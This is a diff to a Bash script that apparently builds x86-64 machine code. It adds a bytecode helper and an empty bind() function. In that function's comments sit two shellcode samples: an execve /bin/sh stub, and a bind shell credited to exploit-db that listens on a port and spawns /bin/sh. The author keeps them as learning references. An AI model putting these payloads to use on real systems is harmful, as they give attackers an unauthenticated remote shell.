@@ -840,8 +840,9 @@ function system_call_write()
 	local CURRENT_RIP="$5";
 	if [ "${TYPE}" == "${SYMBOL_TYPE_STATIC}" ]; then
 		echo -n "$(system_call_write_addr "${OUT}" "${DATA_ADDR_V}" "${DATA_LEN}")";
-	elif [ "${TYPE}" == ${SYMBOL_TYPE_REGISTER} -a "${DATA_ADDR_V}" == "$( echo -n ${ARCH_CONST_ARGUMENT_COUNTER_POINTER} | base64 -w0)" ]; then
+	elif [ "${TYPE}" == ${SYMBOL_TYPE_PROCEDURE} -a "${DATA_ADDR_V}" == "$( echo -n ${ARCH_CONST_ARGUMENT_COUNTER_POINTER} | base64 -w0)" ]; then
 	{
+		# TODO remove all this bloc and turn into code at the source const argument
 		local DATA_LEN="${SIZE_64BITS_8BYTES}"; # The RSP is a 64bits so 8 bytes
 		local CODE="";
 		CODE="${CODE}${MOV_RAX}$(printEndianValue $SYS_WRITE $SIZE_64BITS_8BYTES)";
@@ -1012,8 +1013,51 @@ function system_call_exec()
 # The issue is that, in build time, we can not see that value, so we need to create a dynamic ref
 # so we can evaluate it at runtime.
 # 
-# My strategy is to set the constat _ARG_COUNTER_ then I can figure out latter that is means "RSP Integer"
+# My strategy is to set the constant _ARG_COUNTER_ then I can figure out latter that is means "RSP Integer"
 # Probably should prefix it with the jump sort instruction to make sure those bytes will not affect
 # the program execution. But not a issue now.
 ARCH_CONST_ARGUMENT_COUNTER_POINTER="_ARG_CNT_";
 ARCH_CONST_ARGUMENT_ADDRESS="_ARG_ADDR_ARG_ADDR_";
+function mov_arg_count_bytecode_to_address()
+{
+	local target_addr="$1";
+	# Copy the RSP value (8 bytes) to memory address
+	MOV_RSP_TO_ADDR4="\x48\x89\x24\x25";
+	local code="";
+
+	# Why ADDR 4 bytes instead of 8? And how to do in bigger addresses ?
+	
+	code="${code}${MOV_RSP_TO_ADDR4}$(printEndianValue "${target_addr}" "${SIZE_32BITS_4BYTES}")" # mov %rsp, addr
+	#code="${code}${NEAR_RET}";
+	echo -en "${code}" | base64 -w0;
+}
+
+function bind()
+{
+## I have found this shell code only and it seems to be a BIND exploit
+# I believe it can be useful to learn how to listen a port:
+#  "\x48\x31\xc0"
+#  "\x48\x89\xc2"
+#  "\x48\x89\xc6"
+#  "\x48\x8d\x3d\x04\x00\x00\x00\x04\x3b"
+#  "\x0f\x05"
+#  "\x2f\x62\x69\x6e\x2f\x73\x68\x00\xcc\x90\x90\x90";
+#  https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.
+#
+# https://www.exploit-db.com/exploits/41128
+#  "\x48\x31\xc0"
+#  "\x48\x31\xd2"
+#  "\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f"
+#  "\x0f\x05"
+#  "\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a"
+#  "\x0f\x05"
+#  "\x5e\x6a\x32\x58"
+#  "\x0f\x05"
+#  "\x6a\x2b\x58"
+#  "\x0f\x05"
+#  "\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21"
+#  "\x0f\x05"
+#  "\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b"
+#  "\x0f\x05";
+  :
+}
